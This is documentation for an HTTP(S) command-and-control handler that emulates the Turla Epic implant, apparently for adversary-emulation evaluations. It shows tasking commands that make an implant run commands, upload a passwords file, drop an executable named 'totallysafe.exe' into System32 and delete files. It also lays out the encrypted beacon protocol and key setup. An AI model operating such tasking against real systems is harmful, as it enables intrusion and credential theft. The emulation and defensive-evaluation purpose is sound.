# Epic HTTP(S) Handler

The Epic HTTP(S) C2 handler is the server-side counterpart for the Epic implant
and is specifically designed to interact with it over HTTP or HTTPS.

## Usage

### Configuration

To enable and configure the Epic HTTP(S) handler within the control server, edit
the `config/handler_config.yml` from the main C2 server repo. Adjust the `epic`
entry as needed.

HTTP example:
```yaml
epic:
    host: 10.0.2.8
    port: 8080
    use_https: false
    enabled: true
```

HTTPS example:
```yaml
epic:
    host: 10.0.2.8
    port: 8443
    cert_file: ""
    key_file: ""
    use_https: true
    enabled: true
```

Run the `controlServer` binary as `sudo` and look for success messages in
starting up the Epic handler.

### Tasking

To submit a task for the C2 server, use the following command format:

```bash
./evalsC2client.py --set-task [UUID] 'key | value | [optional args]'
```
The `key | value` pair is converted into `key = value` format and placed into
the configuration file portion of the server's response.

The optional args are used for specific commands, as detailed below.

The keys tell the implant what to do:
- `exe` - tells the implant to execute the command contained in the value
  ```
  ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | whoami'
  ```
- `result` - tells the implant to upload the file that is located at the value
  ```
  ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'result | C:\users\bob\passwords.txt'
  ```
- `name` - tells the implant receive a file that the handler is sending to it, with
  the value being the path that the file contents should be written to on the implant
  and an option arg telling the handler the file that it should send
  ```
  ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'name | C:\Windows\System32\totallysafe.exe | hello_world.elf'
  ```
- `del_task` - tells the implant to delete the file that is located at the value
  ```
  ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'del_task | C:\Users\bob\passwords.txt'
  ```

Note: The template for the EPIC C2 handler HTML response has been taken from here: https://securelist.com/the-epic-turla-operation/65545/

## Components

The handler consists of an HTTP(S) web server that listens on a specified
address/port and serves the following URL endpoints:

- `POST /`, where the server expects a message from the implant that sends
  data to the server and allows the server to respond with tasking.

  The implant sends the server a POST request with an encoded, encrypted,
  and compressed JSON in the body in the following format:

  :exclamation: NOTE: the first POST request from the implant is **not**
  encrypted, but is encoded and compressed.

  ```json
  {"UUID":"<UUID>", "type":"<command type>", "data":"<data>"}
  ```
  - The `UUID` field is empty if this is the first time the implant makes
    contact with the server; otherwise, it contains the UUID assigned to it by
    the server. To allow for reproducibility, the server has two hard coded
    UUIDs that it gives out to implants. The first UUID that is given out is
    `218780a0-870e-480e-b2c5dc`, and the second is `51515228-8a7b-4226-e6e3f4`.
    If a third implant is registered, the first implant will automatically be
    deregistered, and its UUID will be given to the third implant. When a
    fourth implant is registered, the second implant is deregistered, and its
    UUID is given to the fourth implant, and so on.
  - The `type` field contains the command type of the command that was executed
    to generate the data in the `data` field.
    - `command` - the `data` field contains the results of a command that was
      run.
    - `upload` - the `data` field contains the contents of the file to be
      uploaded.
    - `download` - the `data` field contains either a success or error message
      that indicates whether the implant was able to download the file.
    - `delete` - the `data` field contains either a success or error message
      that indicates whether the implant was able to delete the file.
  - The `data` field contains base64 encoded results from the command ran for
    the previous communication cycle.

  The server will respond in the following binary format:
  ```
  |-----------------------------------------------------------|
  |      Command Id (unsigned int, 4 bytes, little endian)    |
  |-----------------------------------------------------------|
  |     Payload Size (unsigned int, 4 bytes, little endian)   | 
  |-----------------------------------------------------------|
  |                         Payload                           |
  |-----------------------------------------------------------|
  | Configuration Size (unsigned int, 4 bytes, little endian) |
  |-----------------------------------------------------------|
  |                    Configuration File                     |
  |-----------------------------------------------------------|
  ```
  - The command ID starts at 0 and increments for each command sent to the
    implant.
  - The payload is any executable that the implant should execute. It is
    sent as a base64-encoded string.
  - The configuration file is an ini file that contains any configuration
    information, including sending the implant's UUID and commands to
    execute.

### Encryption

EPIC tasking is AES-256 encrypted with a new session key and IV for every
communication sent. The IV is prepended to the AES encrypted data. The AES
session key is base64 encoded and RSA encrypted then prepended to the IV and
AES encrypted data.

Altogether, the data transformations in pseudocode would look similar to the
following:

```
Base64(RSA_encrypt(Base64(AES_key)) + AES_IV + AES_encrypt(Bzip2(data)))
```

The C2 server and the implant each have an RSA key pair. The keys were
generated using the following commands:

```
# generate the private key
openssl genrsa -out private.pem 2048

# generate the public key
openssl rsa -in private.pem -outform PEM -pubout -out public.pem

# reformat to PKCS1 and DER encoding for use with CryptoPP
openssl rsa -in private.pem -traditional-out privatepkcs1.key -outform der
openssl rsa -pubin -in public.pem -RSAPublicKey_out -out publicpkcs1.key -outform der

# base64 encode the keys for use in C2 server and EPIC payload
cat privatepkcs1.key | base64
cat publicpkcs1.key | base64
```